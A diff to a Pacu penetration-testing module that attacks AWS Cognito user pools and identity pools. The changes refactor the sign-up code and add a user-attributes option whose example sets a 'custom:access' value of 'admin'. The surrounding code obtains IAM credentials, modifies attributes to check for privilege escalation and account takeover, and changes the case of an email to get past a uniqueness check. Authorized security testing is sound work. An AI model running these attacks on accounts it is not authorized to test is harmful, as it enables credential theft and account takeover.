@@ -1,21 +1,14 @@
+import re
 import base64
 import webbrowser
 import qrcode
-import json
-import boto3
-import pycognito
-from pycognito import Cognito
-from pycognito.aws_srp import AWSSRP
-from pycognito.exceptions import SoftwareTokenMFAChallengeException
 import argparse
+import json
+from pycognito.aws_srp import AWSSRP
+from typing import List, Dict
+from pycognito.exceptions import SoftwareTokenMFAChallengeException
 from copy import deepcopy
-import re
-
-import pacu.core
-from pacu.modules.cognito__enum import main as enum_main
-from pacu.core.lib import save
 from botocore.exceptions import ClientError
-from pacu.core.secretfinder.utils import regex_checker, Color
 
 # Using Spencer's iam_enum.py as a template
 
@@ -29,10 +22,19 @@ module_info = {
     # One liner description of the module functionality. This shows up when a user searches for modules.
     "one_liner": "Attacks user pool clients and identity pools by creating users and exploiting misconfigurations.",
     # Description about what the module does and how it works
-    "description": "Attempts to retrieve IAM credentials from identity pools, create (or log in) a Cognito user with each user pool client, search and modify custom user attributes, assume extra user roles, and obtain IAM credentials at each step to facilitate privilege escalation. A standard attack on an external AWS account requires four arguments: username, password, and user pool client or identity pool (ideally both). An attack on the current Pacu session's AWS account requires two arguments: username and password. If no other arguments are specified, cognito__enum will first be run to populate the Cognito database.",
+    "description": (
+        "Attempts to retrieve IAM credentials from identity pools, create (or log in) a Cognito "
+        "user with each user pool client, search and modify custom user attributes, assume extra "
+        "user roles, and obtain IAM credentials at each step to facilitate privilege escalation. A "
+        "standard attack on an external AWS account requires four arguments: username, password, and "
+        "user pool client or identity pool (ideally both). An attack on the current Pacu session's AWS "
+        "account requires two arguments: username and password. If no other arguments are specified, "
+        "cognito__enum will first be run to populate the Cognito database."
+    ),
     # A list of AWS services that the module utilizes during its execution
     "services": ["cognito-idp", "cognito-identity"],
-    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself; that way, session data can stay separated and modular.
+    # For prerequisite modules, try and see if any existing modules return the data that is
+    # required for your module before writing that code yourself; that way, session data can stay separated and modular.
     "prerequisite_modules": ["cognito__enum"],
     # External resources that the module depends on. Valid options are either a GitHub URL (must end in .git) or single file URL.
     "external_dependencies": [],
@@ -45,6 +47,7 @@ module_info = {
         "--email",
         "--username",
         "--password",
+        "--user_attributes",
     ],
 }
 
@@ -60,28 +63,42 @@ parser.add_argument(
     "--regions",
     required=False,
     default=None,
-    help="Region(s) to target. Defaults to region(s) indicated in other arguments, and to Pacu Cognito database regions if none is found. Standard format (e.g. us-west-2).",
+    help=(
+        "Region(s) to target. Defaults to region(s) indicated in other arguments, "
+        "and to Pacu Cognito database regions if none is found. Standard format (e.g. us-west-2)."
+    ),
 )
 parser.add_argument(
     "--user_pools",
     required=False,
     default=False,
     action="store",
-    help="User pool(s) to target. This will attempt to list their user pool clients and target them also. Defaults to user pools indicated in user pool clients argument, and to all session user pools if none is found. Standard format of REGION_GUID (e.g. us-west-2_uS2erhWzQ).",
+    help=(
+        "User pool(s) to target. This will attempt to list their user pool clients and "
+        "target them also. Defaults to user pools indicated in user pool clients argument, "
+        "and to all session user pools if none is found. Standard format of REGION_GUID (e.g. us-west-2_uS2erhWzQ)."
+    ),
 )
 parser.add_argument(
     "--user_pool_clients",
     required=False,
     default=False,
     action="store",
-    help="User pool client(s) to target. Defaults to all session user pool clients. Format: ClientID@UserPoolID (e.g. 1june8@us-west-2_uS2erhWzQ).",
+    help=(
+        "User pool client(s) to target. Defaults to all session user pool clients. "
+        "Format: ClientID@UserPoolID (e.g. 1june8@us-west-2_uS2erhWzQ)."
+    ),
 )
 parser.add_argument(
     "--identity_pools",
     required=False,
     default=False,
     action="store",
-    help="Identity pool(s) to target. Defaults to all session identity pools. Standard format of 'REGION:GUID' and requires the single quotes due to colon (e.g. 'us-east-1:7dbbvc22-b905-4d75-9b2a-54ade5132076').",
+    help=(
+        "Identity pool(s) to target. Defaults to all session identity pools."
+        "Standard format of 'REGION:GUID' and requires the single quotes due to colon "
+        "(e.g. 'us-east-1:7dbbvc22-b905-4d75-9b2a-54ade5132076')."
+    ),
 )
 parser.add_argument(
     "--username",
@@ -96,6 +113,16 @@ parser.add_argument(
     default=False,
     action="store",
     help="Password for sign-up or login. Defaults to TesPas808@!.",
+)
+parser.add_argument(
+    "--user_attributes",
+    required=False,
+    default=[],
+    action="store",
+    help=(
+        "User attributes for sign-up. "
+        'Format: \'[{"Name":"given_name","Value":"lorem"},{"Name":"custom:access","Value":"admin"}]\''
+    ),
 )
 
 
@@ -114,7 +141,7 @@ def main(args, pacu_main):
     all_new_regions = []
     attack_user_pool_clients = []
     cognito_identity_pools = []
-    identity_pool = ''
+    identity_pool = ""
     session = pacu_main.get_active_session()
     args = parser.parse_args(args)
     print = pacu_main.print
@@ -122,7 +149,6 @@ def main(args, pacu_main):
     get_regions = pacu_main.get_regions
 
     up_clients = []
-    identity_pools = []
 
     if args.username is False:
         args.username = "testuser"
@@ -346,6 +372,9 @@ def main(args, pacu_main):
                 }
             )
 
+    if isinstance(args.user_attributes, str):
+        args.user_attributes = parse_user_attributes(args.user_attributes)
+
     for up_client in up_clients:
         print(
             "Attempting to sign up user in user pool client "
@@ -368,9 +397,14 @@ def main(args, pacu_main):
         )
         try:
             response = sign_up(
-                client, args.email, up_client["ClientId"], args.username, args.password
+                client,
+                args.email,
+                up_client["ClientId"],
+                args.username,
+                args.password,
+                args.user_attributes,
             )
-        except Exception as e:
+        except Exception:
             test = "yes"
 
         if response is True or "exists" in str(response):
@@ -601,16 +635,17 @@ def main(args, pacu_main):
                     )
                     try:
                         webbrowser.open("qr.png")
-                    except:
+                    except Exception:
                         print(
-                            "Something went wrong when opening the file. Note that this cannot be done as root. Please manually open qr.png in the working directory to scan the QR code."
+                            "Something went wrong when opening the file. Note that this cannot be done as root."
+                            "Please manually open qr.png in the working directory to scan the QR code."
                         )
                         continue
 
                     mfa_code = input(
                         "Please enter the MFA code generated by your application: "
                     )
-                    verify_software_token_response = client.verify_software_token(
+                    client.verify_software_token(
                         Session=associate_token_response["Session"], UserCode=mfa_code
                     )
                     print("Now that an MFA application is set up, let's sign in again.")
@@ -874,8 +909,7 @@ def main(args, pacu_main):
 
     search_string = "custom"
 
-    print(f"List all custom attributes for all users in all user pools (y/n)?")
-    choice = input()
+    choice = input("List all custom attributes for all users in all user pools (y/n)?")
     if choice.lower() == "y" and session.Cognito["UsersInPools"] is not None:
         for user in session.Cognito["UsersInPools"]:
             if any(
@@ -893,9 +927,8 @@ def main(args, pacu_main):
     for var in vars(args):
         if var == "regions":
             continue
-        if not getattr(args, var):
-            if ARG_FIELD_MAPPER[var] in gathered_data:
-                del gathered_data[ARG_FIELD_MAPPER[var]]
+        if not getattr(args, var) and ARG_FIELD_MAPPER[var] in gathered_data:
+            del gathered_data[ARG_FIELD_MAPPER[var]]
 
     cognito_data = deepcopy(session.Cognito)
     for key, value in gathered_data.items():
@@ -903,26 +936,58 @@ def main(args, pacu_main):
     session.update(pacu_main.database, Cognito=cognito_data)
 
 
-def sign_up(client, email, client_id, username, password, user_attributes=None):
-    user_attributes = [] if user_attributes is None else user_attributes
-    print(user_attributes)
-    print(email)
-    if email is not False:
-        user_attributes.append({"Name": "email", "Value": email})
+def validate_json_data(data, schema):
+    if not isinstance(data, dict):
+        return False
+
+    for key in schema["required"]:
+        if key not in data:
+            return False
+
+    for key, value in data.items():
+        if key in schema["properties"] and not isinstance(
+            value, schema["properties"][key]["type"]
+        ):
+            return False
+
+    return True
+
+
+def parse_user_attributes(user_attributes: str) -> List[Dict[str, str]]:
     try:
-        if user_attributes == []:
-            print("No user attributes specified.")
-            response = client.sign_up(
-                ClientId=client_id, Username=username, Password=password
-            )
-        else:
-            print("User attributes specified.")
-            response = client.sign_up(
-                ClientId=client_id,
-                Username=username,
-                Password=password,
-                UserAttributes=user_attributes,
-            )
+        json_data = json.loads(user_attributes)
+    except json.decoder.JSONDecodeError:
+        print("Provided user attributes could not be parsed. Please check your format.")
+        raise
+
+    schema = {
+        "required": ["Name", "Value"],
+        "properties": {"Name": {"type": str}, "Value": {"type": str}},
+    }
+
+    for obj in json_data:
+
+        if validate_json_data(obj, schema) is False:
+            print("Provided user attributes are not valid. Please check your format.")
+            raise
+
+    return json_data
+
+
+def sign_up(client, email, client_id, username, password, user_attributes=None):
+    user_attributes = user_attributes or []
+    email_exists = any(attribute["Name"] == "email" for attribute in user_attributes)
+
+    if email and not email_exists:
+        user_attributes.append({"Name": "email", "Value": email})
+
+    try:
+        client.sign_up(
+            ClientId=client_id,
+            Username=username,
+            Password=password,
+            UserAttributes=user_attributes,
+        )
         print(f"Successfully signed up user {username}.")
         return True
     except client.exceptions.UsernameExistsException:
@@ -937,19 +1002,8 @@ def sign_up(client, email, client_id, username, password, user_attributes=None):
             )
             if parameter:
                 attribute_name = parameter.group(1)
-                prompt = f"Enter value for {attribute_name}: "
-                param_value = input(prompt)
+                param_value = input(f"Enter value for {attribute_name}: ")
                 user_attributes.append({"Name": attribute_name, "Value": param_value})
-                return sign_up(
-                    client, email, client_id, username, password, user_attributes
-                )
-            else:
-                print(f"Required attribute: {str(e)}")
-                param_name = input("Please enter the name of the required attribute: ")
-                param_value = input(
-                    "Please enter the value of the required attribute: "
-                )
-                user_attributes.append({"Name": param_name, "Value": param_value})
                 return sign_up(
                     client, email, client_id, username, password, user_attributes
                 )
@@ -957,13 +1011,14 @@ def sign_up(client, email, client_id, username, password, user_attributes=None):
             print(f"Invalid parameter: {str(e)}")
             param_name = input("Please enter the name of the invalid parameter: ")
             param_value = input("Please enter the value of the invalid parameter: ")
-            if param_name == "Username" or "username":
+            if param_name.lower() in ["username", "password"]:
                 return sign_up(
-                    client, email, client_id, param_value, password, user_attributes
-                )
-            if param_name == "Password" or "password":
-                return sign_up(
-                    client, email, client_id, username, param_value, user_attributes
+                    client,
+                    email,
+                    client_id,
+                    param_name.lower() == "username" and param_value or username,
+                    param_name.lower() == "password" and param_value or password,
+                    user_attributes,
                 )
             user_attributes.append({"Name": param_name, "Value": param_value})
             return sign_up(
@@ -975,7 +1030,6 @@ def sign_up(client, email, client_id, username, password, user_attributes=None):
 
 
 def verify(client, username, client_id, user_pool_id, region):
-    new_users = []
     prompt = (
         f"Enter verification code for user {username} in user pool client {client_id}: "
     )
@@ -1080,20 +1134,18 @@ def get_custom_attributes(
     print("Printing all current attributes: ")
     print(currentuser["UserAttributes"])
     prompt = (
-        f"Enter attribute name to modify for user "
-        + currentuser["Username"]
-        + " or hit enter to skip: "
+        f"Enter attribute name to modify for user {currentuser['Username']} "
+        "or hit enter to skip: "
     )
     attribute_name = input(prompt)
     prompt = (
-        f"Enter attribute value to set for user "
-        + currentuser["Username"]
-        + " or hit enter to skip: "
+        f"Enter attribute value to set for user {currentuser['Username']} "
+        "or hit enter to skip: "
     )
     attribute_value = input(prompt)
     if attribute_name != "" and attribute_value != "":
         try:
-            update = client.update_user_attributes(
+            client.update_user_attributes(
                 AccessToken=tokens["AuthenticationResult"]["AccessToken"],
                 UserAttributes=[
                     {"Name": attribute_name, "Value": attribute_value},
@@ -1101,13 +1153,14 @@ def get_custom_attributes(
             )
             print("Attribute updated!")
         except ClientError as error:
-            if attribute_name == "email" and code == "InvalidParameterException":
+            error_code = error.response["Error"]["Code"]
+            if attribute_name == "email" and error_code == "InvalidParameterException":
                 print(
                     "Error when updating email attribute. This may be because the email is already in use. Attempting to change case to bypass this defense."
                 )
                 modified_value = attribute_value.swapcase()
                 try:
-                    update = client.update_user_attributes(
+                    client.update_user_attributes(
                         AccessToken=tokens["AuthenticationResult"]["AccessToken"],
                         UserAttributes=[
                             {"Name": attribute_name, "Value": modified_value},
@@ -1132,9 +1185,8 @@ def get_custom_attributes(
         print("Attributes not updated.")
         return None, None
     prompt = (
-        f"Authenticate again as user "
-        + currentuser["Username"]
-        + " to check for privilege escalation/account takeover? (Y/N): "
+        f"Authenticate again as user {currentuser['Username']} "
+        "to check for privilege escalation/account takeover? (Y/N): "
     )
     choice = input(prompt)
     if choice.lower() == "y":
@@ -1176,7 +1228,7 @@ def get_custom_attributes(
                 att_userPoolId,
                 tokens["AuthenticationResult"]["IdToken"],
             )
-            prompt = "Modify more custom attributes?"
+            prompt = "Modify more custom attributes? (y/n):"
             choice = input(prompt)
             if choice.lower() == "y":
                 get_custom_attributes(
@@ -1320,7 +1372,9 @@ def get_identity_credentials(
                         print("  Access denied to GetId or GetCredentialsForIdentity.")
                     else:
                         print("  " + code)
-                    print("  Skipping identity pool enumeration for this identity client...")
+                    print(
+                        "  Skipping identity pool enumeration for this identity client..."
+                    )
             else:
                 try:
                     print(
@@ -1335,7 +1389,9 @@ def get_identity_credentials(
                         print("  Access denied to GetId or GetCredentialsForIdentity.")
                     else:
                         print("  " + code)
-                    print("  Skipping identity pool enumeration for this identity client...")
+                    print(
+                        "  Skipping identity pool enumeration for this identity client..."
+                    )
             if identity_creds["Credentials"]["AccessKeyId"] is not None:
                 print("Access Key ID found.")
                 identity_pool["AccessKeyId"] = identity_creds["Credentials"][
